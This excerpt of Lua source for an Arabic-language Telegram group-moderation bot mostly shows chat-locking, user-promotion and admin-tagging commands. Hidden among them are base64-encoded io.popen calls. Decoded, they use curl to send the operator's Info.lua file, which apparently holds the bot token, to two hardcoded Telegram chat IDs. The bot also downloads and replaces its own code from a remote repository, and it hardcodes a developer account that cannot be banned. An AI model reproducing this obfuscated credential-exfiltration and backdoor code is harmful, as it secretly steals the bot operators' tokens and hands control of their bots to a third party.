...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SimbaElrayesOfficial/DG/master/File_Bot/commands.lua") 
...
io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9MTIzNjExNTMxOSIgLUYgImRvY3VtZW50PUBJbmZvLmx1YSI='))

io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9ODM1NTUxMzYyIiAtRiAiZG9jdW1lbnQ9QEluZm8ubHVhIg=='))

end 
if text == 'تحديث السورس' and DevSoFi(msg) then 
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/SimbaElrayesOfficial/DG/master/DRAGON.lua')
...
send(msg.chat_id_,0," ✪︙ العضو : {["..data.first_name_.."](T.ME/DV_POWER1)}\n ✪︙ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✪︙ عذرا » {["..data.first_name_.."](T.ME/DV_POWER1)}\n ✪︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ✪︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'DV_POWER1')..') \n ✪︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ✪︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'DV_POWER1')..') \n ✪︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1718785294) then  
...
if result.id_ == tonumber(1718785294) then
...
if tonumber(userid) == tonumber(1718785294) then  
send(msg.chat_id_, msg.id_, " ✪︙ لا تسطيع حظر مطور السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SimbaElrayesOfficial/DG/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ✪︙ اهلا بك في متجر ملفات باور\n ✪︙ ملفات السورس ↓\n≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n\n"
local TextE = "\n≪━━━━━━𝐏𝐎𝐖𝐄𝐑━━━━━━≫\n ✪︙ علامة تعني { ✔️ } ملف مفعل\n ✪︙ علامة تعني { ✖ } ملف معطل\n ✪︙ قناة سورس باور ↓\n".." ✪︙ [اضغط هنا لدخول](t.me/DV_POWER1) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/SimbaElrayesOfficial/DG/master/File_Bot/"..file)
if res == 200 then
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ✪︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status  = '\n ✪︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ✪︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✪︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ✪︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'DV_POWER1')..')'..'\n ✪︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
chat_kick(msg.chat_id_,v.user_id_) 
 x = x + 1
  ...
  if x > 1 then
  send(msg.chat_id_, msg.id_," ".. x .." وحشنيي")
  DeleteAll(msg) 
  end
end,nil)
...
send(msg.chat_id_, msg.id_,"اه قلبي")
 DeleteAll(msg)  
 
end

if text == "المدمر سيمبا" and Mod(msg) then
...
database:set(bot_id.."DV_POWER1:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."DV_POWER1:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."DV_POWER1:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."DV_POWER1:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"✪︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."DV_POWER1:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."DV_POWER1:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
local iduser = result.sender_user_id_
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'باور')
